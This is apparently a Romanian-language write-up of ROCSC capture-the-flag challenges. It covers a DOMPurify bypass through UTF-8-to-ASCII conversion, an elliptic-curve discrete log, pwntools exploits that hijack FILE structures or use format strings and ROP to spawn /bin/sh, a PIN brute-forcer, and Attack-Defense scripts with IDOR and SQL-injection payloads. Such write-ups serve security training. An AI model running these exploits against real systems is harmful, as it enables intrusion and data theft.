De ce? Sau cum de am știut că trebuie să fie acolo?

Doar am aplicat un proces de eliminare:
* Știm că trebuie să obținem XSS pentru a obține flag-ul.
* Notele sunt salvate în mod sigur.
* Atunci vulnerabilitatea trebuie să fie în modul în care este afișată nota.

Și ce legătură are `.toString('ascii')`? Aici trebuie să vorbim despre modul în care sunt codificate caracterele. Ascii reprezintă codificarea pe 8 biți sau 1 octet. Asta înseamnă că putem avea maxim 2^8 = 256 de caractere diferite.

Dacă ne gândim la câte caractere în alte limbi există, emoji-uri și așa mai departe, este clar că acest mod nu poate fi folosit pentru a reprezenta exact acest tip de conținut.

Dar, atunci când salvăm o notă, noi nu o salvăm în codificarea ASCII. Dacă ne uităm în documentația Node, putem găsi această frază:
```
Node's default encoding for strings is UTF-8
```

[Wikipedia explică destul de bine codificarea UTF-8](https://en.wikipedia.org/wiki/UTF-8), dar pe scurt, această codificare ne ajută să reprezentăm mult mai multe caractere.

De exemplu, emoji-ul 🚩 este reprezentat în UTF-8 prin secvența de octeți `f0 9f 9a a9`. Cum arată totuși această secvență dacă o trecem prin funcțiile `Buffer.from('🚩').toString('ascii')`?

Ei bine, arată așa: `p\x1F\x1A)`, unde putem observa caracterele printabile 'p' și ')', '\x1F' și '\x1A' fiind caractere neprintabile, conform ![](https://media.geeksforgeeks.org/wp-content/uploads/20240304094301/ASCII-Table.png).

Un lucru important de știut este că DOMPurify operează pe string-uri UTF-8. Deci, chiar dacă poate depista un XSS în UTF-8, acest lucru nu este valabil și pentru o conversie UTF-8 -> sanitizare -> ascii. Deoarece DOMPurify are grijă să nu strice caracterele UTF-8 valide, până la urmă cum ar fi dacă am avea 🚩 într-o notă pe bune și nu am putea vedea emoji-ul după ce salvăm? :)

Tot ce avem de făcut pentru a avea un payload valid este să găsim ce caracter UTF-8 atunci când este transformat în ASCII, produce caracterele `<` și `>`:

```js
let dompurify = require("isomorphic-dompurify");

for (let i = 0; i <= 65535; i++)
  {
    let data = Buffer.from(String.fromCharCode(i)).toString('ascii');
    // test if < or > is present in the output
    if (data.endsWith('<'))
    {
      console.log('<', i, data);
    }
    if (data.endsWith('>'))
    {
      console.log('>', i, data);
    }
  }

console.log(dompurify.sanitize('\ufd3c'));
```

Raportăm nota către admin și primim flag-ul pe requestrepo:

**CTF{1edcb4125573c79a8b1b651c47be24e62da2421ba6c357be90b321857412174c}**

<a name="solve-this"></a>
## solve-this (267 pts, 13 solves) - Cryptography

Enunt:
```
Poți te rog să rezolvi acest exercițiu pentru mine?

Flag format: flag{sha256}
```

Aceasta este problema:

```py
n = 3542351939701992275231003142553
a = 126512569275071152686821540801
b = 3415839370426921122544181601752

x = 1  # Find x
# P = (2631211060304008450389410782950: 1597897356677072100955051755088: 1)
# Q = (1249902752727911034264929949680: 3043929197938243211289309561776: 1)
```

Mai este cunoscută și ca problema logaritmului discret. Doar că avem de-a face cu curbe eliptice. Conform Wikipedia: O curbă eliptică este definită peste un corp K și descrie punctele din K^2, produsul cartezian al lui K cu el însuși.

Putem folosi SageMath pentru a rezolva problema pentru noi:

```py
n = 3542351939701992275231003142553
a = 126512569275071152686821540801
b = 3415839370426921122544181601752
F = GF(n)
E = EllipticCurve(F, [0, 0, 0, a, b])

# Define the points P and Q
P = E(2631211060304008450389410782950, 1597897356677072100955051755088)
Q = E(1249902752727911034264929949680, 3043929197938243211289309561776)

# Calculate the discrete logarithm
x = P.discrete_log(Q)

# Print the result
print(x)
```

Și găsim că `x=588581747331`.

**flag{b2a3253556aeb3bb0f1782c083e90b6de968688d3f435863b82597e6f5efe4c0}**

<a name="spanzuratoarea"></a>
## spanzuratoarea (467 pts, 1 solve) - Pwn

Enunt:
```
Ai învățat până acum cum să joci Spânzurătoarea?
```

Script de rezolvare:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./spanzuratoarea_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.107.107.240", 30151)

    return r


def main():
    r = conn()

    # gdb.attach(r, gdbscript="""
    # break *0x4015BE
    # continue
    # """)

    # Initialize a FileStructure object
    fake_stdout = FileStructure()

    # Set up the fake stdout to include the leak to stderr
    fake_stdout.flags = 0x2  # Set flags to writable
    fake_stdout._IO_write_ptr = 1  # Write pointer position
    fake_stdout._IO_write_base = 0  # Write base position
    fake_stdout._IO_buf_base = 0  # Buffer base
    fake_stdout._IO_buf_end = 0  # Buffer end
    fake_stdout.fileno = 1  # File descriptor

    libc_addr = 0x403F98

    fake_chunk = flat(
        0xfbad0800, 0,
        libc_addr, 0,
        libc_addr, libc_addr + 0x8,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        1,
    )

    r.sendlineafter(b'M-am saturat', b'1')
    r.sendlineafter(b'cuvant', b'-5')
    r.sendafter(b'ghici > ', fake_chunk)

    libc_leak = u64(r.recv(8))
    libc_base = libc_leak - libc.sym['puts']

    libc.address = libc_base
    log.info(f"libc base: {hex(libc_base)}")

    #stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
    stdout_lock = libc.sym['_IO_stdfile_1_lock']
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    #gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx
    gadget = next(libc.search(asm('add rdi, 0x10 ; jmp rcx')))

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    import time


    time.sleep(0.5)
    #r.sendlineafter(b'M-am saturat', b'1')
    r.sendline(b'1')
    time.sleep(0.1)
    r.sendline(b'-5')
    time.sleep(0.1)
    r.send(bytes(fake))

    r.interactive()


if __name__ == "__main__":
    main()
```

**Ctf{r3arr4ng3_th3_f1l35_unt1l_y0u_contr0l_th3_n4rr4t1v3}**

<a name="zero-shot"></a>
## zero-shot (50 pts, 34 solves) - ML/AI

Enunt:
```
Sunt foarte curios cum Inteligența Artificială o să ne transforme viața în viitorul apropiat. 

Dacă ești interesat să îți povestesc mai multe, obține secretul din fișierele primite și îți voi zice tot ce vrei să știi.

Target: http://142.93.100.92:19417/
```

O soluție prin care optimizăm procentul de `leet` într-un mod greedy (la fiecare iterație, luăm caracterul care ne-a dat cel mai bun scor):

```py
import requests

flag = list('LL3EE3E3E3L3eEE33ee3lett')

for i in range(2, 20):
  sc = 0
  b = None
  for c in "lL3eE":
    while True:
      try:
        burp0_url = "http://142.93.100.92:19417/api/v1/predict"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://142.93.100.92:19417", "Referer": "http://142.93.100.92:19417/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}

        flag[i] = c
        s = "".join(flag)

        burp0_json={"prompt": s}

        data = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies={'http':'http://127.0.0.1:8080/'}).json()
        score = data["aggregate"]["totalScores"]["l33t"]
        if data["aggregate"]["totalScores"]["l33t"] > data["aggregate"]["totalScores"]["sad"]:
          print("found", "".join(flag), data["flag"])
        if score > sc:
          b = c
          sc = score
        break
      except (ConnectionError, requests.exceptions.JSONDecodeError):
        continue

  flag[i] = b
  print(''.join(flag), sc)
```

**FLAG{4ae71f2c915017fd4c00b7374419c6ce9a29f03f72183b2919cd2032ba4d6aa2}**

<a name="jeopardy-rocsc"></a>
# Jeopardy ROCSC

Niște probleme puțin mai grele date doar concurenților care au participat la ROCSC.

<a name="keylogger"></a>
## keylogger (433 pts, 7 solves) - Network

Enunt:
```
Analizează fișierul primit și obține secretul.

Flag format: CTF{sha256}
```

Problema a fost foarte similară cu aceasta: [https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html](https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html)

Script de rezolvare:
```py
from json import load, dump
import json


with open("hci.json", "r") as f:
    t = load(f)

def get_key_btatt_value(cap):
    """ Data in flight captured through btmon of a HID like a keyboard will use the btatt protocol's value field to transmit

    This functions gets only the btatt.value field as a list in order of packet time
    """
    l = []
    for x in cap:
        try:
            btatt_value = x['_source']['layers']['btatt'].get('btatt.value')
            if btatt_value:
                l.append(btatt_value)
        except (AttributeError, KeyError):
            pass
    return l

def is_key_press(p):
    """ Bluetooth keyboards will not only communicate OnKeyPress
    but also onKeyReleased. We need to filter that out.
    """
    if len(p) == 20:
      data = p.split(':')
      is_keyval = int(data[1], 16) != 0
      has_timestamp = int(data[2], 16) != 0 #I think this data value is a timestamp or velocity value?
      return is_keyval and not has_timestamp
    else:
      return False


def get_key_value(l):
    out = ''

    #alphabet
    translator = {i:chr(i+93) for i in range(4,30)}

    #symbols
    translator[42] = "<BKSP>"
    translator[44] = " "
    translator[40] = "\n"
    translator[56] = "?"
    translator[46] = "+"
    translator[52] = "'"
    translator[54] = ","

    #numbers
    translator[39] = "0"
    numbers = {i+29:str(i) for i in range(1,10)}
    translator.update(numbers)

    for x in get_key_btatt_value(l):
        if is_key_press(x):
            data = x.split(':')
            i = int(data[1], 16)
            c = translator.get(i, "<?_{}_?>".format(i))

            # Check SHIFT key down in the first byte
            if data[0] == "20":
                c = "<SHFT_{}>".format(c)

            out += c

    return out

cap = json.load(open("hci.json", "r"))

print(get_key_btatt_value(cap))
print(get_key_value(cap))
```

**ctf{d173aa2d229f7f5a4277ef306f0d339a92871c34afc6cced5afce7610266556d}**

<a name="magic"></a>
## magic (467 pts, 3 solves) - Pwn

Enunt:
```
Se dă un binar scris în limbajul de programare C. 

Să se identifice vulnerabilitatea prezentă în binar și să se obțină flag-ul.

Identificați valoarea "magică" ca să puteți obține manipularea executiei codului.

Flag format: CTF{sha256}
```

Script de rezolvare:

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./magic_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("35.246.128.32", 31485)

    return r


def main():
    r = conn()

    r.sendlineafter(b'Enter your choice: ', b'1')

    # gdb.attach(r, gdbscript="""
    # break *0x0000555555400E4A
    # continue"""
    # )

    r.sendlineafter(b'Size:', b'2')
    r.sendlineafter(b'Enter the message to write to syslog: ', b'%p '* 10 + b' %75$p %80$p')

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = d.split(b' ')

    libc_leak = int(d[-1],16)
    stack_leak = int(d[-2], 16)
    heap_leak = int(d[-6], 16)

    libc.address = libc_leak - libc.sym.__libc_start_main - 0xe7
    log.info(f'Libc base: {hex(libc.address)}')
    log.info(f'Stack leak: {hex(stack_leak)}')
    log.info(f'Heap leak: {hex(heap_leak)}')

    stack_target = stack_leak - 24

    to_add = (stack_target - heap_leak) // 8

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    bin_sh = next(libc.search(b'/bin/sh\x00'))

    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak) // 8)} {hex(libc.sym["system"])}'.encode())
    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 8) // 8)} {hex(bin_sh)}'.encode())

    ret = rop.find_gadget(['ret'])[0]

    r.sendlineafter(b'Enter your choice: ', b'1')

    # gdb.attach(r, gdbscript="""
    # break *0x0000555555400E4A
    # continue"""
    # )

    r.sendlineafter(b'Size:', b'2')
    r.sendlineafter(b'Enter the message to write to syslog: ', b'%p '* 10 + b' %75$p %80$p')

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = d.split(b' ')

    #libc_leak = int(d[-1],16)
    #stack_leak = int(d[-2], 16)
    heap_leak = int(d[-6], 16)

    log.info(f'Libc base: {hex(libc.address)}')
    log.info(f'Stack leak: {hex(stack_leak)}')
    log.info(f'Heap leak: {hex(heap_leak)}')

    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 16) // 8)} {hex(pop_rdi)}'.encode())
    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 24) // 8)} {hex(ret)}'.encode())

    r.interactive()


if __name__ == "__main__":
    main()
```

**CTF{9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08}**

<a name="decrypt-this"></a>
## decrypt-this (483 pts, 1 solve) - Cryptography

Enunt:
```
Tocmai ce ai primit câteva date encriptate și cheile necesare pentru a le decripta. Știind că mecanismul folosit este RSA-PKCS, iar PIN-ul are doar 5 cifre, cum ai putea decripta datele primite?

Flag format: CTF{sha256}
```

Primim conținutul unui `token digital`, folosit pentru semnături electronice.

```py
import os
import subprocess

# Constants
softhsm_lib_path = '/usr/lib/softhsm/libsofthsm2.so'
token_label = 'Default'
data_file = 'data.bin'

# Function to brute-force the PIN
def brute_force_pin():
    for pin in range(100000):
        pin_str = f"{pin:05d}"
        print(f"Trying PIN: {pin_str}")

        try:
            # Attempt to login with the current PIN using p11tool
            os.popen('cp /home/adragos/softhsm2/orig/80837632-90de-859e-38fc-a89393b35f19/token.object /home/adragos/softhsm2/80837632-90de-859e-38fc-a89393b35f19/token.object').read()
            result = subprocess.run(
                ['pkcs11-tool', '--module', '/usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so', '-l', '-t', '-p', pin_str],
                capture_output=True, text=True, check=True
            )

            # If successful, return the PIN
            print(f"Successfully authenticated with PIN: {pin_str}")
            return pin_str
        except subprocess.CalledProcessError:
            # If the command fails, it means the PIN is incorrect
            continue

    return None

# Brute-force the PIN
found_pin = brute_force_pin()

if not found_pin:
    print("Failed to find the correct PIN")
    exit(1)

print(found_pin)(base)
```

Și aflăm PIN-ul 12345. Îl putem folosi pentru a decripta conținutul fișierului și a obține flag-ul:

**CTF{4E669FC71463B0C0C13488E4B8627267399E581C4A2AD2D19FFEC44A65AAB8B0}**

<a name="attack-defense"></a>
# Attack & Defense

În esență, un concurs Attack & Defense implică mai multe echipe care concurează simultan, fiecare primind acces la aceleași servicii vulnerabile, găzduite pe mașini virtuale numite "vulnbox". In cazul RoCSC / Olimpiada de Securitate Cibernetica, echipele sunt formate dintr-un singur participant.


Obiectivul este dublu: să menții propriile servicii funcționale și să exploatezi vulnerabilitățile din sistemele adversarilor. Punctele se acumulează atât pentru apărare, cât și pentru atac reușit.

În paralel, sistemul automat de verificare, numit "checker", monitorizează constant starea serviciilor fiecărei echipe. Verifică dacă serviciile funcționează corect și dacă vulnerabilitățile au fost remediate corespunzător. Înțelegerea modului în care funcționează acest checker este vitală pentru menținerea unui SLA ridicat.

Un element cheie al acestor competiții este conceptul de SLA (Service Level Agreement). SLA reprezintă procentul de timp în care serviciul tău a trecut de testele checkerului automat. Este crucial să înțelegi că SLA-ul tău afectează direct scorul total. De exemplu, un SLA de 50% înseamnă că vei obține doar jumătate din punctajul potențial.

În ceea ce privește punctarea, este important de menționat că nu primești puncte pentru apărare (defense). În schimb, poți doar pierde puncte dacă alți competitori reușesc să îți fure flag-urile. Punctele se acumulează exclusiv pentru atacurile reușite asupra serviciilor altor echipe.

Un alt element esențial este gateway-ul central. Acesta rescrie traficul de rețea între echipe, asigurând anonimitatea atacurilor. Practic, nu poți ști cine te atacă, ceea ce adaugă un nivel suplimentar de complexitate scenariului. Trebuie să fii pregătit să te aperi împotriva oricui, în orice moment.

Pentru a avea succes în aceste competiții, echipele folosesc o varietate de instrumente. Câteva exemple includ:

* [Tulip](https://github.com/OpenAttackDefenseTools/tulip) - pentru a monitoriza traficul
* [DestructiveFarm](https://github.com/DestructiveVoice/DestructiveFarm) - pentru a ataca toate echipele simultan

<a name="eeeinvoice"></a>
## eeeinvoice - A/D

Un exemplu de atac folosit:

```py
#!/Users/adragos/miniconda3/bin/python

import random
import sys
import json

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target_ip/team_id> [flagstore json]")
    sys.exit(1)

ip, team_id = sys.argv[1].split('/') if '/' in sys.argv[1] else (sys.argv[1], None)
flagstore = json.loads(open(sys.argv[2],"r").read() if len(sys.argv) > 2 else "[]")

ip = ip + "2"

import requests

url = "http://"+ip+":8000/"

import random
import string

s = requests.Session()

r = s.get(url + "register")
csrf_token = r.text.split('_token" value="')[1].split('"')[0]

print(csrf_token)

username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
email = username + "@bitsentinel.ro"

data = {
  "_token": csrf_token,
  "name": username,
  "password": password,
  "email": email,
  "password_confirmation": password
}

r = s.post(url + "register", data=data)

data = {
  "_token": csrf_token,
  "recipient": username,
  "amount": random.randint(1, 1000),
  "description": "7vwp6i6vglw0kqy_2654 Here I might add a flag ..."
}

r = s.post(url + "invoice/create", data=data)

last_id = int(s.get(url + "dashboard").text.split('<td class="py-4 px-6">')[1].split('</td>')[0])

for id in range(last_id, last_id - 20, -1):
  r = s.get(url + f"invoice/export/{id}")
  print(r.text, flush=True)
```

<a name="lazypeoninn"></a>
## lazypeoninn - A/D

Un exemplu de atac folosit:

```py
#!/Users/adragos/miniconda3/bin/python

import random
import sys
import json

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target_ip/team_id> [flagstore json]")
    sys.exit(1)

ip, team_id = sys.argv[1].split('/') if '/' in sys.argv[1] else (sys.argv[1], None)
flagstore = json.loads(open(sys.argv[2],"r").read() if len(sys.argv) > 2 else "[]")

ip = ip + "3"

import requests


url = "http://"+ip+":5000/review/read?code=%27%20UNION%20SELECT%20ingredients,%201,%201%20FROM%20dish;--%20-"

r = requests.get(url)
print(r.text, flush=True)
```